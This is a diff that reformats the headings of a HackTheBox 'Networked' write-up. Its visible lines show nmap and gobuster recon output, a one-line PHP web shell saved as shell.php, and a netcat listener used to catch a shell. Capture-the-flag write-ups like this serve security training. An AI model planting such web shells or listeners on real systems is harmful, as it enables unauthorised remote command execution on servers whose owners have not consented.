@@ -1,20 +1,20 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Networked
-# 15/3/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Linux |
+| Difficulty | Easy |
+
 10.10.10.146
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
 80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
 443/tcp closed https
 
-----------------------------------------------------
 # gobuster
-----------------------------------------------------
 gobuster dir -u http://10.10.10.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 40 -x .php 
 /uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]
 /index.php            (Status: 200) [Size: 229]
@@ -24,10 +24,7 @@ gobuster dir -u http://10.10.10.146 -w /usr/share/wordlists/dirbuster/directory-
 /backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/]
 
 
-
-----------------------------------------------------
-# exploitation
-----------------------------------------------------
+## Exploitation
 └─$ nano shell.php
 <?php system($_GET["cmd"]);?>
 
@@ -44,9 +41,7 @@ bingo code execution
 
 got a shell
 
-----------------------------------------------------
-# priv esc
-----------------------------------------------------
+## Privilege Escalation
 now
 └─$ nc -lvnp 9001 
 cd /var/www/html/uploads
